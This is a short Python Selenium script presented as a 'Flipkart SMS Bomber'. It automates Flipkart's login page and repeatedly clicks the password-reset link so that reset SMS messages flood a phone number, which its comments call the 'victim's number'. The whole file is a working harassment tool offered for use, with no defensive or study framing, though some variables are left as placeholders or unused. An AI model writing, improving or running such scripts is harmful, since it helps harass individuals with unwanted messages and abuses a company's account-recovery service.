from selenium import webdriver
import time
 
print('''
 ______ _       _     _               
|  ____| |     | |   | |              
| |__  | |_   _| |__ | |__   ___ _ __ 
|  __| | | | | | '_ \| '_ \ / _ \ '__|
| |    | | |_| | |_) | |_) |  __/ |   
|_|    |_|\__,_|_.__/|_.__/ \___|_|   
                                      
                                      ''')
print('###########################################################################')
print('======================Made By:- Hacker--Rohan Raj==========================')
print('===========================================================================')
print('==================Flubber- A Simple Flipkart SMS Bomber====================')
print('===========================================================================')
print('===========================================================================')
print('###########################################################################')
print('Go to Line 22 and Type the Path of your chromedriver')
print('Go to Line 39 and Type Your Phone Number')
browser = webdriver.Chrome("D:\Your_Name\chromedriver.exe")
 
# set the frequency of sms which is approx maximum to 10 per 24 days
frequency = 1
 
# target mobile number, change it to victim's number and
# also ensure that it's registered on flipkart
mobile_number =""
 
for i in range(frequency):
    browser.get('https://www.flipkart.com/account/login?ret=/')
 
    # find the element where we have to
    # enter the number using the class name
    number = browser.find_element_by_xpath('//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')
 
    # automatically type the target number
    number.send_keys("Your Phone Number")
     
    # find the element to send a forgot password
    # request using it's class name
    forgot = browser.find_element_by_link_text('Forgot?')
     
    # clicking on that element
    forgot.click()
     
    # set the interval to send each sms
    time.sleep(2)
     
# Close the browser
browser.quit()